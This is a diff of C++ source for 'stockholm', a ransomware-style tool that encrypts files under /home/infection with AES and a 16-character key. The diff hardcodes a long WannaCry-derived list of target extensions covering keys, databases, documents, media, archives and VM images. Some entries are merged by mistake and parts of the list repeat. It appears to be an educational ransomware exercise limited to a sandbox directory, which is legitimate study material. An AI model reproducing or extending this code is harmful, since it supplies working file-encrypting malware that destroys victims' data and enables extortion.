@@ -46,7 +46,7 @@ void encrypt_file(const std::string& inputFile, const std::string& outputFile, c
     outData.resize(outLen + finalLen);
 
     std::ofstream out(outputFile, std::ios::binary);
-    out.write(reinterpret_cast<char*>(iv), EVP_MAX_IV_LENGTH); // Écrire IV au début du fichier
+    out.write(reinterpret_cast<char*>(iv), EVP_MAX_IV_LENGTH);
     out.write(reinterpret_cast<char*>(outData.data()), outData.size());
     out.close();
 
@@ -97,7 +97,40 @@ void decrypt_file(const std::string& inputFile, const std::string& outputFile, c
 
 void    handle_options(int argc, char *argv[]) {
     bool silent = false;
-    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "-help") == 0) {
+    std::vector<std::string> target_extensions = {
+        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt",
+        ".ott", ".sxw", ".stw", ".uot.3ds", ".max.3dm", ".ods", ".ots",
+        ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd",
+        ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6",
+        ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db",
+        ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf",
+        ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js",
+        ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch",
+        ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class",
+        ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob",
+        ".mpeg", ".asf", ".avi", ".mov", ".mp4.3gp", ".mkv.3g2", ".flv",
+        ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar.7z",
+        ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
+        ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti",
+        ".sxi.602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1",
+        ".wks.123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml",
+        ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm",
+        ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
+        ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx",
+        ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc", ".wma", ".mid",
+        ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff",
+        ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
+        ".vcd", ".iso", ".backup", ".zip", ".rar.7z", ".gz", ".tgz", ".tar",
+        ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk",
+        ".vdi", ".sldm", ".sldx", ".sti", ".sxi.602", ".hwp", ".snt", ".onetoc2",
+        ".dwg", ".pdf", ".wk1", ".wks.123", ".rtf", ".csv", ".txt", ".vsdx",
+        ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
+        ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt",
+        ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
+        ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx",
+        ".doc", };
+
+    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "-help") == 0){
         std::cout << "Usage: ./stockholm [key | -option (key)]" << std::endl;
         std::cout << "Encrypts files using a 16-chararacters-long key.\n" << std::endl;
         std::cout << "Options:" << std::endl;
@@ -142,16 +175,6 @@ void    handle_options(int argc, char *argv[]) {
             
         if (key.length() != 16)
             throw std::invalid_argument("Key must be 16 characters long.");
-
-        std::vector<std::string> target_extensions;
-        std::ifstream extensions("wannacry_extensions.txt");
-        if (!extensions)
-            throw std::runtime_error("Could not open file with target extensions list.");
-        std::string ext;
-        while (std::getline(extensions, ext)) {
-            ext.erase(ext.find_last_not_of(" \n\r\t") + 1);
-            target_extensions.push_back(ext);
-        }
 
         std::filesystem::recursive_directory_iterator it("/home/infection");
         std::filesystem::recursive_directory_iterator end;
